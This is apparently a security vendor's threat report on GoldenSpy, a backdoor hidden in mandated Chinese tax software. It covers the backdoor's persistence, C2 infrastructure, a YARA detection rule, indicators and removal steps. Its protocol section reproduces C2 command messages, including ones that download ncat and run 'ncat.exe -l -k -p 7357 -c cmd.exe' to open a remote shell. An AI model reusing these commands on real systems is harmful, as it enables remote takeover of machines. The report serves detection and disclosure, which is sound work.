The Golden Tax Department and the Emergence of GoldenSpy Malware

GoldenSpy Threat Report Highlights
• Trustwave SpiderLabs has identified a new threat targeting corporations conducting business in China. The victim company is
required to install software that will enable payment of local taxes. However, a backdoor is hidden within the software package
that provides full remote command and control of the victim system, enabling arbitrary remote execution of code, and a
remote shell.
• Through the course of this investigation, we discovered several variations of this backdoor. The first version has a compilation
timestamp in 2016 but it does not appear to have been analyzed or categorized prior to 2020. As a service to the security
community, we are providing full malware analysis as part of this report and we have named this malware family “GoldenSpy”.
• The hidden GoldenSpy backdoor (svm.exe) is covertly downloaded two hours after the Aisino Intelligent tax software
installation is completed. It calls out to a Chinese domain with a reputation of distributing variations of GoldenSpy. Svm.exe
exfiltrates basic system information and continuously beacons to a remote server for “updates.” This “update” functionality
enables remote execution of arbitrary code and provides remote command execution capability.
• Trustwave SpiderLabs believes that this threat became active in April of 2020, when the ningzhidata[.]com domain first
delivered the current version of GoldenSpy. The domain was registered on 22 September 2019.
• Trustwave SpiderLabs was engaged for a threat hunt shortly after our client was compromised, enabling us to disrupt the
potential attack early in the kill chain. For this reason, we were not able to gather sufficient TTP’s to confidently attribute
GoldenSpy to a specific threat actor group. Therefore, we will refrain from claiming attribution in this report.
• The full scope of this threat is currently unknown, but our client reported that installation of this software was required by their
Chinese bank as a prerequisite to paying local Chinese taxes. We believe that all corporations with Chinese operations should
investigate for presence of GoldenSpy and remediate if necessary.
• This report provides identified IOC’s (Indicators of Compromise), as well as IOC’s known to be associated with the network
architecture used with this threat. We have also provided specific hunting, investigative, and remediation methodologies that
can be used to ensure your environment is clean.

The Golden Tax Department and the Emergence of GoldenSpy Malware

A Note First
Trustwave SpiderLabs has confirmed that, as of April 2020, the GoldenSpy backdoor is embedded in the Aisino Intelligent Tax software suite and
that it has impacted corporations doing business in China. We do not yet know the scope, purpose, or actors behind the threat. Has it impacted
hundreds of customers, or just a few? Is it designed to compromise networks and exfiltrate data or was it just a very, very poorly designed updater?
Is this a Nation-State sponsored threat campaign, was it planted by a malicious insider at the software design company, or even by an unknown
adversary external to the company?
These are all questions that we have wrestled with as we wrote this report.
The GoldenSpy campaign, as detailed in this report, has the characteristics of a coordinated Advanced Persistent Threat (APT) campaign targeting
foreign companies operating in China. However, we cannot definitively know why this malware is present because we caught it early in the kill
chain and we have no way to discern answers to the key questions: who (is behind this activity), what (data is being targeted), and why (these
actions were taken).
In this report, we have carefully crafted our language to not claim more than we can confirm with the facts. However, we can clearly say that, at
best, presence of GoldenSpy will violate compliance requirements for most regulatory agencies and surrender command and control of infected
systems to an unknown remote adversary. At worst, we have identified an APT campaign targeting companies operating in China and professional
hackers now have a wide-open backdoor into impacted networks.
At this point, we cannot confirm one way or the other. However, we are still actively investigating and seeking out more information. If you have
any information about this activity or feel you may have been victimized by this attack, please reach out to Trustwave SpiderLabs at GoldenSpy@
trustwave.com.
We are available for advice, information exchange, or to engage threat hunting / forensic investigation services.

Thank you,
Trustwave SpiderLabs

Aisino Corporation and Nanjing Chenkuo Network Technology were contacted and briefed on these findings, as part of Trustwave’s documented
vulnerability disclosure process. At time of publication of this report, neither have responded

The Golden Tax Department and the
Emergence of GoldenSpy Malware
Story of the Threat
Trustwave SpiderLabs, during a recent threat hunting engagement, discovered a Chinese cyber threat targeting corporations operating in China.
This report details the attack methodology, suspected entities behind the activity, and protective measures to mitigate risk of being impacted.
The following series of events detail the threat.
1

Our client, a global technology vendor, upon opening operations in China was advised by their Chinese bank that they were
required to install a software suite that would enable payment of local taxes. Utilizing this software was a requirement for them
to conduct business in China.

2

The tax software suite, “Intelligent Tax” produced by the Golden Tax Department of Aisino Credit Information Co. conducts
tax operations, as expected. However, it also covertly downloads and executes a file called svminstaller.exe, which installs
two identical executables called svm.exe and svmm.exe (GoldenSpy MD5: 2c5557250cbd3f7ff3f778aa4fc6e479) from
download.ningzhidata[.]com and installs them in: C:\Program Files\svm. Both establish persistence by running silently in the
background as autostart services.

3

Svm.exe gathers system information and exfiltrates it to www.ningzhidata[.]com on port 9006. The malware maintains
persistence by monitoring itself and if the process is stopped, it will respawn. Additionally, it sends requests to a remote server
to update itself (a method to execute additional operations), and it stands open as a backdoor into the environment enabling
the command and control server to upload and execute arbitrary code or commands with System privileges.

The Trustwave SpiderLabs threat hunt identified and disrupted the potential attack at this point, so we are unable to state specific next steps that
may have been taken, however, it is clear the operators would have had the ability to conduct reconnaissance, spread laterally, and exfiltrate data.
Additionally, there are several key elements to svm.exe that stand out as unusual:
1

Both svm and svmm are installed as autostart services, and if either is killed, they will respawn each other. Additionally,
static analysis showed the exeprotector module monitors both svm and svmm to see if either are missing (deleted), if so, it
downloads and executes a new version. Triple-layer persistence functionality is not normal for tax software.

2

The uninstall functionality for the tax software will not uninstall svm or svmm. It leaves them running as an open backdoor into
the environment, even after the tax software is removed.

3

The tax software installation process creates and executes a binary called plugin.exe. After a two-hour delay, plugin.exe
downloads and silently executes svminstall.exe, which installs svm.exe and sv mm.exe. The 2-hour delay in this process is
highly unusual and may be to ensure the covert installation is not identified by the victim.

4

Svm.exe does not contact the tax software’s network infrastructure (i-xinnuo[.]com), rather it reaches out to ningzhidata[.]com,
a domain known to host GoldenSpy. After the first three attempts to contact its command and control server, it randomizes
beacon times. This is a method to avoid network security technologies designed to identify beaconing malware.

5

Svm.exe operates with System level privileges, making it highly dangerous and capable to execute any tool on the system. This
includes separate malware or Windows administrative tools to conduct reconnaissance, create new users, escalate privileges,
etc.

6

Svm.exe sends the basic operating system information to the remote domain and constantly attempts to download and
execute files from ningzhidata[.]com. While we did not observe a file being downloaded, it will execute anything a potential
attacker wishes to upload, including trojans or ransomware.

Based on the facts presented above, Trustwave SpiderLabs believes that this supposed updater is a significant threat to anyone required to utilize
this tax software. Especially considering that the Golden Tax software already contains a valid update mechanism, not related to svm.exe.

Svm.exe’s digital signature (shown below) displays a company called Chenkuo Network Technology Co. The digital signature’s name and
description are identical: 认证软件版本升级服务, which translates to “certified software version upgrade service”.

At this point, we are unable to determine how widespread this software is. We currently know of one targeted technology/software vendor and
a highly similar incident occurring at a major financial institution, but this could be leveraged against countless companies operating and paying
taxes in China or may be targeted at only a select few organizations with access to vital information.
Aisino Corporation, an IT and electronics company, created the tax software, whose use was mandated by their Chinese Bank. Aisino Credit
Information Co. is a subsidiary that owns i-xinnuo[.]com, the domain responsible for distributing the tax software. The graphic below shows the
relationships between the various entities mentioned in this report and GoldenSpy.

Figure 1: Known players in the creation and delivery of GoldenSpy backdoor
Trustwave SpiderLabs has conducted this research to shine a light on a potentially wide-spread threat. Corporations that install the tax software
risk opening a backdoor into their network that could be leveraged to execute network-wide compromise, data breach, and/or loss of research
and development. We recommend immediately removing any Aisino Tax software which includes mechanisms to download GoldenSpy. If this is
not possible for business-criticality reasons, take steps to remove GoldenSpy specifically, hunt for the IOC’s provided in this report, and blacklist all
malicious code and C2 servers from your network.

Currently the samples listed in the table above have antivirus detection ratios ranging from 9/72 (12.6%) to 53/73 (72.6%). Increasing detection
ratios may precipitate the threat actor altering their code to improve antivirus evasion ability. Trustwave SpiderLabs has found solid success in
identifying malicious code variants within the same family through the use of threat hunting with YARA signatures. The following YARA signature is
provided as a method for identifying malicious code that may be an unknown GoldenSpy variation.

rule GOLDENSPY_svmdropper:APT
{
meta:
author = “SpiderLabs Trustwave”
date = “2020-06-03”
sample_filetype = “exe”
strings:
$reg = “Software\\IDG\\DA” nocase wide ascii		
// registry entry
$str1 = “requestStr” nocase wide ascii			
// POST request the machine details
with this parameter
$str2 = “nb_app_log_mutex” nocase wide ascii		
// Mutex
$str3 = {510F4345[0-10]50518D8DCCFE[0-20]837D1C[0-20]8D45[0-15]0F4345[0-20]505157} //Data
collection and passed to requestStr in POST
condition:

}

(uint16(0) == 0x5A4D) and $reg and 2 of ($str*)

Figure 2: YARA rule for detection of svm.exe variations
Running this YARA signature in VirusTotal identified 27 malicious binaries not previously discussed in this report. Not all had the same functionality
and purpose as svm.exe, but they shared some distinct inherent characteristics that indicate a relationship and that they either shared the same
original author or, at least shared the same original codebase. All were identified as from Chinese origin, with varying detection levels by the
antivirus vendors represented in VirusTotal. The SHA-256 hash values are provided below and should be proactively blocked by organizations
wishing to prevent compromise by this threat actor.

Network Infrastructure and IOC’s
GoldenSpy (svm.exe) receives updates and commands from several subdomains of ningzhidata[.]com. The domain was registered to Alibaba
Cloud Computing on September 22, 2019, however, there are no records of it on the Internet before April of 2020. This domain and its
subdomains have resolved to a number of IP addresses, however, based on their certificates, most are a part of the qcloud CDN and appear
to only host downloads. There are two IP addresses which we believe to be the actual servers behind ningzhidata[.]com, 49.232.156.177 and
223.112.21.2.
Of these two servers the first is the most important. It is the same IP which is hardcoded into plugin.exe as part of the svm.exe installation process.
It is also consistently reported to abuse lists for attempting to log into computers without authorization.
The installation of svm.exe is initiated by the plugin.exe component of the Aisino tax software. The following diagram shows the network
connections made in the setup and operation of svm.exe.

Other TTP’s Inherent to GoldenSpy and Golden Tax Software
As attackers frequently update their TTP’s, it is important to identify behavioral and static indicators to search for elements of this threat that may
present themselves in unknown variations of this attack. Trustwave SpiderLabs provided the GoldenSpy_svmdropper:APT YARA rule for exactly
this reason, but there are several other unusual characteristics of this malicious code that can be used in threat hunting operations.

Common TTP’s shared by the tax software and svm.exe
While svm.exe appears to be independent from the main tax software, internal strings from the code share several elements, suggesting some
shared creation resources. Examples of these common items include:
• Ryeol HTTP Client: T
 his library from 2007 is utilized by both svm.exe and the tax software to facilitate HTTP Internet
communication. This is an old and unusual http library for modern legitimate software.
• SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\fwkp.exe: T
 his is a hardcoded string present in svm.exe but
appears to be utilized as part of legitimate functions within the original tax software.
• SOFTWARE\skfpkprj\skfpkprj: T
 his is a hardcoded string present in svm.exe but appears to be utilized as part of legitimate
functions within the original tax software.

Non-standard ports used in this campaign
The following ports were observed to be used in this campaign:
• Ports 9005, 9006: Ports used for svm.exe network traffic.
• Port 9002: Used by updater service to request a link to download svm.exe.
• Port 8090: While we didn’t observe this directly in our analysis, there are indicators on public scan sites that svm is downloaded
over this port in some circumstances.
• Port 33666: WebSocket established by Golden Tax software on installation

Non-standard User-Agent Strings
Unusual user-agent strings exist in the network traffic generated by GoldenSpy. In the first instance, the user-agent and the newline character
which is supposed to follow it were missing, resulting in a distinctively malformed http header. The first two screenshots below show correctly
formatted user-agent strings, “Agent0” and “Ryeol HTTP Client Class” which can also be used as network indicators. The third User-Agent string
in particular indicates usage of the obscure 2007 Ryeol HTTP library mentioned earlier in this report.

Pluginsetup.exe
This setup file installs two executable files under the folder %WinDir%\System32\PluginManager.
• MPlugin.exe (MD5: 946945ee4555fc7f7aced80904fe802f) – this executable file monitors and makes sure that plugin.exe
process is running. When plugin.exe is terminated, it will respawn it. It also checks tax software update from the host: http://
upgrade.i-xinnuo[.]com.
• Plugin.exe (MD5: 134d9ffc9c65366e690c2a4852ec6835) – This is the main plugin manager program. A thread is created
to get instructions from the execute commands from the remote host http://upgrade.i-xinnuo[.]com mainly for managing tax
software plugins.
It has a thread for the command handler where it parses the JSON file return by the remote host.
Command Includes:
• Download and execute plugin
• Uninstall plugin
• Upgrade plugin
• Delete plugin
• Start plugin
• Stop plugin
• Stratagy – the purpose of this command is currently unknown to us.
• Feedback

13

The Golden Tax Department and the Emergence of GoldenSpy Malware

It also creates a thread to communicate to a web socket address - ws://172.46.16.23:33666/websocket/. We have not however invested our time
investigating the reason behind this because it failed to connect to this host at the time of analysis.
The last thread that plugin.exe created and caught our attention is the thread that covertly downloads a malicious file - svminstall.exe. The
download happens two hours after the installation. The HTTP POST body when requesting for the download link contains a request string in JSON
format that includes the infected system’s MAC address, the software name, version number and ID. The remote host returns a JSON data that
includes the link to http://download.ningzhidata[.]com/download/svminstall.exe which is then installed in the infected system.

Plugin.exe and mplugin.exe logs their activities and save it to a file under the same folder where they are installed. It uses a filename format {Year}
{Month}{Day}-Plugin.log & {Year}{Month}{Day}-MPlugin.log. The log is encrypted with SM4 Block cipher with a 16-byte key and then encoded in
Base64.

Svminstall.exe – (GoldenSpy)
Binary Overview
File Version: 1.0.0.1
Product Version: 1.2.0.0
Version: V1.0-20200301 (Version reported to the Control Server)
At the time of analysis, V1.0-20200301 was analyzed but a newer version also appeared V1.2-20200407 with compile time of 2020-04-07 08:44:13
UTC.
Svm.exe installs itself as two services named SVM and SVMM, and has two main functions:
• ExeProtector that spawns off a separate thread to protect svm.exe and svmm.exe. There are also some other modes e.g.
console that does this in the main thread.
• Connects to a control server to report itself and wait for additional commands.

ExeProtector
The ExeProtector monitors the file C:\Program Files (x86)\svm\svm.exe (and presumably its counterpart svmm.exe if it is running as svm.exe). If this
file is missing it connects to the server expecting a message with a format similar to:

{

}

“code”: “0”,
“data”: {
“softList”: [
{
“excuteExe”: “true”,
“version”: “V1.2-20200407”,
“soft”: “SVM”
}
]
}

This will download the latest version of the file. However, if svm.exe already exists then no new update is retrieved. The ExeProtector then ensures
that svm.exe is kept running.

Command Retrieval and Dispatching
This sub-system reports system identification and allows random remote code execution on the system from the control server. In addition, it also
supports pushing of arbitrary files into the system including executables.
The system communicates using http with JSON payload over port 9006. This is hardcoded to communicate to http://www.ningzhidata[.]com:9006/
softServer/req

Protocol
Svm.exe generates a uuid as its unique id and stores this information in the registry location: HKLM\Software\IDG\DA. This id is specified as uid in
its messages to the control server.
On startup, it reaches out to the server every two minutes 2 to 3 times before slowing down its communication by a randomized time interval.

NOTE: the protocol here is largely done through reverse engineering rather than observing actual communication between svm.exe and server hosted at http://www.ningzhidata[.]com:9006/

15

The Golden Tax Department and the Emergence of GoldenSpy Malware

Communication from svm.exe to server
Format is in JSON and messages to the server are identified by a protocol id, and we have identified three different protocol ids.
• PROTOCOL_01 – svm.exe is sending host environment information (install date, version, etc...)
• PROTOCOL_00 – reporting and requesting for commands from server
• PROTOCOL_99 – requesting for software update list, expecting list of software and download location for each.

Communication from server to svm.exe
Format is also in JSON and contains at least one code field. An optional data field indicates which command or order is to be executed on the
remote machine.
We have identified four different commands:
• order0 – null command
• order1 – send software update information to remote machine
• order2 – send host environment information back to server (PROTOCOL_01)
• order3 – run executable on remote machine

Requesting host environment information – order2
This is done by the server using order2 and encoded in the following way:

{“code”: “0”, “data”: {“orderId”: “order2”}}

And svm.exe replies with a message similar to the following:

{

}

“data”: {
“installtime”: “20200606 14: 53: 32”,
“name”: “SVM”,
“os”: “Microsoft Windows Server 2010”,
“shList”: “”,
“version”: “V1.2-20200407”
},
“pid”: “PROTOCOL_01”,
“uid”: “E4AA0B7D-F997-410E-B7A4-8C1DDBFC9293”

Running an executable on the remote machine – order3
This is done by the server using order3 and with the specified command line string in the cmd field. This string is run using WinExec() API which
includes command-line arguments.

16

The Golden Tax Department and the Emergence of GoldenSpy Malware

The following example runs win32calc.exe found in C:\Windows\System32

{

}

“code”: “0”,
“data”: {
“orderId”: “order3”,
“cmd”: “C:\\Windows\\system32\\win32calc.exe”
}

The result is shown below (note that there are two win32calc.exe as the message was sent twice to svm.exe)

Downloading and running a new executable on the machine - order1
This is a slightly more complicated process as it involves a multiple exchanges between the server and svm.exe.
The server sends instruction to install software using order1 command. This tells svm.exe where to get the software update list and the version to
retrieve.
A sample message from the server telling svm.exe to download software package ncat version ‘1.1’ from the specified URL.

{

}

“code”: “0”,
“data”: {“orderId”: “order1”,
“url”: “http://192.168.176.1:9006/download/ncat”,
“softName”: “ncat”,
“softVer”: “1.1”
}

Svm.exe will then contact http://192.168.176.1:9006/download/ncat with a software update request or PROTOCOL_99.

17

The Golden Tax Department and the Emergence of GoldenSpy Malware

It will send form request data with the following request:

{

}

“data”: {
“softList”: [
{

},
“pid”: “PROTOCOL_99”,
“uid”: “E4AA0B7D-F997-410E-B7A4-8C1DDBFC9293”

The server then responds with a list of files to be downloaded and its location for this software package. This is specified using a softList response
as follows:

{

}

“code”: “0”,
“data”: {
“softList”: [
{
“address”: “http://192.168.176.1:9006/file/download/libeay32.dll”,
“version”: “1.1”,
“soft”: “libeay32”
},
{
“address”: “http://192.168.176.1:9006/file/download/ssleay32.dll”,
“version”: “1.1”,
“soft”: “ssleay32”
},
{
“address”: “http://192.168.176.1:9006/file/download/ncat.exe”,
“version”: “1.1”,
“soft”: “ncat”
}
]
}

WinExec() API call is also attempted for each file downloaded. The packages downloaded are stored in the temp directory. In this example, once
Ncat has been installed, a remote shell can easily be started by sending an order3 command, similar to the following:

{

}

“code”: “0”,
“data”: {
“orderId”: “order3”,
“cmd”: “C:\\windows\\temp\\ncat.exe -l -k -p 7357 -c cmd.exe”
}

This will open port 7357 and spawn cmd.exe upon connection. This only works if firewall is disabled, but a callback shell can easily be adapted.
With Ncat listening on port 7357, remote shell can be accessed by telnetting to the port.

Logging
Same as plugin.exe, svm.exe also has a logging capability and stored it under the folder %ProgramFiles%\svm\log. They only differ on how the
logs are stored where plugin.exe encrypts its log while svm.exe does not.

Recommended Risk Mitigation Measures
Trustwave SpiderLabs strongly recommends threat hunting for the IOC’s provided in this report, specifically for organizations with operations in
China. The following are recommended first steps:
• Hunt for active network connections matching:
› Traffic going to ningzhidata[.]com
› Use of Ryeol HTTP Client user-agent in packets (*please note, there is a chance of a high false positive rate as this library
and user-agent are still used by some legitimate software.)
› In conjunction with above, search for external traffic to ports 9002, 9005, 9006 to unauthorized domains/IP.
•

Windows event logs indicating creation of svmm or svm services, review event logs 601, 4697, and 7045.

• Use the provided YARA rule to scan your hosts.
If you confirm presence of this malicious code in your environment, follow your existing IR procedures to document and remediate the incident.
Outside of the normal IR procedures there are some special considerations for this software.
Post incident response investigation, reimaging the system and starting from a known good state is preferable, however, if this action is not
practical because of business criticality reasons, the malicious elements of the Golden tax software package can be manually removed. The main
tax software does include an uninstall package, but it is only for the tax-related elements of the software. Svm.exe and svmm.exe are not affected
by the main software removal process. To remove SVM from host:
1

Freeze both svm.exe and svmm.exe processes (since it will respawn itself if killed normally)

2

Kill SVM processes

3

Go to SVM directory and permanently delete related files

4

Remove all registry artifacts related to SVM service

5

Restart host

6

Use provided YARA rules to hunt for any leftovers, and remove if anything stays in the system

If, for any business reason, you cannot perform the malicious software removal, we recommend:
• Harden host OS following NIST hardening checklist, or at bare minimum:
›
›
›
›
›
›
›
›

Baseline your company golden image and remove any non-critical software
Enable firewall and ensure communications for tax services is only allowed to appropriate domain
Ensure antivirus system is installed and updated
Ensure all system security updates are installed
Disable all not used devices (printers, Bluetooth, network cards etc.) and services
Remove all non-critical for operation users (like administrator, guest etc.) from the host
Clear any sensitive data not necessary for tax filing
Block remote connections

• Remove remote access to company data
• Do not connect host to the domain, use local non-admin user to work with the host
• Isolate host from company network
• Have separate dedicated Internet connection or isolate and secure one on network segments
• Ensure that network IDS is seeing host activity
• Ensure that you have installed EDR solution on the host
